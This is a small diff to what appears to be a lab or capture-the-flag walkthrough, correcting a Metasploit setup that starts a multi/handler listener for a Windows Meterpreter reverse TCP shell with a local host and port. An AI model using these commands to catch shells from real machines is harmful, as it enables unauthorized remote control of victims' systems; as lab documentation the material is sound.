@@ -66,7 +66,7 @@ use exploit/multi/handler
 set payload windows/meterpreter/reverse_tcp
 show options
 set Lhost 10.10.14.200
-set rport 8765
+set lport 8765
 ````
 
 Create you yml file 
